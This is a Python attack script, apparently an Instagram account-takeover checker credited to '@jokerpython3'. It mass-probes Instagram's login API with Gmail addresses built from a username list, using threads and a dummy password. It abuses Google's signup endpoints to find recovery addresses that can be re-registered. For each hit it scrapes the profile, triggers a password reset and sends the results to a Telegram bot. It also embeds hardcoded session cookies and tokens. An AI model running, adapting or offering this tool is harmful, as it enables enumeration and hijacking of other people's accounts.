import os
try:
	import requests
	from user_agent import generate_user_agent
	import uuid
	import string
	import random
	import re
	import threading,json
except:
	os.system('pip install requests')
	os.system('pip install user_agent')
	os.system('pip install uuid')
#-------------[]-------------        
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
#-------------[]------------
class S1:
    def __init__(self):
        self.a = 'qwertyuiopasdfghjklzxcvbnm'
        self.thread_limit = 23
        self.ty= 263014407
        self.idd= 361365133
        self.hit=0
        self.tf=0
        self.f=0
        self.tok=input(f"{HH} Token: {M}")
        self.id=input(f"{HH} ID: {M}")
        for _ in range(self.thread_limit):
            threading.Thread(target=self.ser).start()

    def reset_password(self, email):
        token = "".join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=32))
        url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
        headers = {
            'Content-Length': '328',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com',
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 6.12.1 Android (30/11; 320dpi; 720x1339; realme; RMX3269; RED8F6; RMX3265; ar_IQ)',
            'Cookie': 'mid=Z0ZQoQABAAFHk8B-qvDkQ4bq_XLc; csrftoken=wf5gPNZiHZptDbscGF9l1QX2YYNgi1oK',
            'Cookie2': '$Version=1',
            'Accept-Language': 'ar-IQ, en-US',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
        }
        data = {
            'user_email': email,
            'device_id': str(uuid.uuid4()),
            'guid': str(uuid.uuid4()),
            '_csrftoken': token
        }
        response = requests.post(url, headers=headers, data=data).json()
        try:
            return response["obfuscated_email"]
        except KeyError:
            return ''

    def get_account_creation_year(self, user_id):
        try:
            user_id = int(user_id)
            if 1 < user_id < 1279000:
                return 2010
            elif 1279001 < user_id < 17750000:
                return 2011
            elif 17750001 < user_id < 279760000:
                return 2012
            elif 279760001 < user_id < 900990000:
                return 2013
            elif 900990001 < user_id < 1629010000:
                return 2014
            elif 1900000000 < user_id < 2500000000:
                return 2015
            elif 2500000000 < user_id < 3713668786:
                return 2016
            elif 3713668786 < user_id < 5699785217:
                return 2017
            elif 5699785217 < user_id < 8507940634:
                return 2018
            elif 8507940634 < user_id < 21254029834:
                return 2019
            else:
                return "2020-2023"
        except ValueError:
            return ''

    def get_user_info(self, email):
        user = email.split('@')[0]
        cookies = {
            'datr': 'lhI2Z-qsh_SE2tBAm-z9sT8c',
            'ig_did': 'FBBFF354-5D64-40BE-82A6-F40D4C80FC4E',
            'mid': 'ZzYSlgABAAFR3pvSs-MtncGVPir1',
            'ig_nrcb': '1',
            'ps_l': '1',
            'ps_n': '1',
            'dpr': '2.1988937854766846',
            'ds_user_id': '277613183',
            'csrftoken': 'S1tFXRCsflUJCBKWav6rP8d0DsnfiEMP',
            'wd': '891x1654',
            'rur': '"LLA\\054277613183\\0541764135205:01f7191faf0392a232a09e8551689df778531b54d6147fb6b0ee28550084ef623409d5ce"',
        }
        headers = {
            'authority': 'www.instagram.com',
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://www.instagram.com/dd/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Linux"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': generate_user_agent(),
            'x-asbd-id': '129477',
            'x-csrftoken': 'S1tFXRCsflUJCBKWav6rP8d0DsnfiEMP',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR07T_Q0xaDQfazO_ogFm4DlAfLnCNNeQ0b0skK1F4sWzJzO',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {'username': user}
        response = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            cookies=cookies,
            headers=headers,
        )
        profile = response.json()
        try:
            bio = profile["data"]["user"]["biography"]
        except KeyError:
            bio = None
        try:
            followers = profile["data"]["user"]["edge_followed_by"]["count"]
        except KeyError:
            followers = None
        try:
            following = profile["data"]["user"]["edge_follow"]["count"]
        except KeyError:
            following = None
        try:
            user_id = profile["data"]["user"]["id"]
            creation_year = self.get_account_creation_year(user_id)
        except KeyError:
            user_id = None
            creation_year = None
        try:
            is_private = profile["data"]["user"]["is_private"]
        except KeyError:
            is_private = None
        try:
            username = profile["data"]["user"]["username"]
        except KeyError:
            username = None
        try:
            posts = profile["data"]["user"]["edge_owner_to_timeline_media"]["count"]
        except KeyError:
            posts = None
        try:
            full_name = profile["data"]["user"]["full_name"]
        except KeyError:
            full_name = None
        reset_info = self.reset_password(email)
        info = f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 
𝐈𝐍𝐒𝐓𝐀
═══════════════════
 -ᗷY: @jokerpython3 •
═══════════════════    
• 𝙽𝙰𝙼𝙴 • {full_name}
• 𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 • @{username}
• 𝙶𝙼𝙰𝙸𝙻 • {email}
• 𝐑𝐞𝐬𝐭 • {reset_info} •
• 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 •  {following}
• 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 • {followers} •
• 𝙸𝙳 • {user_id}
• 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 • {is_private}
• 𝐩𝐨𝐬𝐭 • {posts}
• 𝐝𝐚𝐭𝐚 • {creation_year}
• 𝐛𝐢𝐨 • {bio}                                                   
═══════════════════
 -ᗷY: @jokerpython3 •
═══════════════════
"""
        print(info)
        requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(info))

    def generate_token(self):
        try:
            s1 = "".join(random.choice(self.a) for _ in range(random.randrange(6, 9)))
            s2 = "".join(random.choice(self.a) for _ in range(random.randrange(6, 9)))
            s3 = "".join(random.choice(self.a) for _ in range(random.randrange(15, 30)))
            cookies = {'__Host-GAPS': s3}
            headers = {
                'authority': 'accounts.google.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'upgrade-insecure-requests': '1',
                'user-agent': generate_user_agent(),
            }
            response = requests.get(
                'https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                cookies=cookies,
                headers=headers,
            )
            match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', response.text)
            if not match:
                return
            token = match.group(2)
            headers.update({
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?continue=https://www.google.com/search&q=dhduud&hl=ar',
            })
            data = {
                'f.req': f'["{token}","{s1}","{s2}","{s1}","{s2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            response = requests.post(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies,
                headers=headers,
                data=data,
            )
            try:
                tl = str(response.text).split('",null,"')[1].split('"')[0]
            except IndexError:
                return
            host = response.cookies.get('__Host-GAPS', '')
            try:
                os.remove('tl.txt')
            except FileNotFoundError:
                pass
            with open('tl.txt', 'a') as f:
                f.write(tl + '//' + host + '\n')
        except Exception as e:
            print(f"Error generating token: {e}")

    def check_username_availability(self, email):
        self.generate_token()
        try:
            with open('tl.txt', 'r') as f:
                o = f.read().splitlines()[0]
            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f'https://accounts.google.com/signup/v2/createusername?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Ddhduud%26oq%3Ddhduud%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzU2OWowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8&hl=ar&parent_directed=true&ddm=1&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
                'user-agent': generate_user_agent()
            }
            params = {'TL': tl}
            if '@' in email:
                em = email.split('@')[0]
            data = f'continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Ddhduud%26oq%3Ddhduud%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzU2OWowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8&ddm=1&flowEntry=SignUp&hl=ar&f.req=%5B%22TL%3A{tl}%22%2C%22{em}%22%2C0%2C0%2C1%2Cnull%2C0%2C4244%5D&at=AFoagUVsrVfPNg-a8rn4W680UeR-MWyEuA%3A1736097014549&azt=AFoagUUrcmcr8XBhg_vKXr4N_weEu2kZlg%3A1736097014549&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A639&checkedDomains=youtube&pstMsg=1&'
            response = requests.post(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )
            if '"gf.uar",1' in response.text:
                self.get_user_info(email)
                self.hit+=1
                os.system('cls'if os.name=='nt' else'clear')
                print(f"""{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.hit}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗜𝗡𝗦𝗧𝗔 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━""")
            else:

                self.tf+=1
                os.system('cls'if os.name=='nt' else'clear')
                print(f"""{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.hit}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗜𝗡𝗦𝗧𝗔 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━""")
        except Exception as e:
            pass

    def check_login(self, email):
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {
            'Content-Length': '349',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com',
            'Connection': 'Keep-Alive',
            'User-Agent': 'Instagram 113.0.0.39.122 Android (30/11; 320dpi; 720x1339; realme; RMX3269; RED8F6; RMX3265; ar_IQ)',
            'Cookie': 'mid=Z0ZQoQABAAFHk8B-qvDkQ4bq_XLc; csrftoken=wf5gPNZiHZptDbscGF9l1QX2YYNgi1oK',
            'Cookie2': '$Version=1',
            'Accept-Language': 'ar-IQ, en-US',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': 'AQ==',
            'Accept-Encoding': 'gzip',
        }
        data = {
            'username': email,
            'password': 'S1',
            'device_id': str(uuid.uuid4()),
        }
        response = requests.post(url, headers=headers, data=data).text

        if "bad_password" in response:
            self.check_username_availability(email)
            os.system('cls'if os.name=='nt' else'clear')
            print(f"""{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.hit}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗜𝗡𝗦𝗧𝗔 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━""")
        else:
        	self.f+=1
        	os.system('cls'if os.name=='nt' else'clear')
        	print(f"""{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.hit}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗜𝗡𝗦𝗧𝗔 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━""")	
        	            

    def ser(self):
    	with open('S1.txt','r') as ee:
    		oo=ee.read().splitlines()
    	for user in oo:
    		if '..' in user or '_' in user:
    			continue
    		elif len(user)<5 or len(user)>30:
    			continue
    		else:
    			self.check_login(user+'@gmail.com')
S1()#موط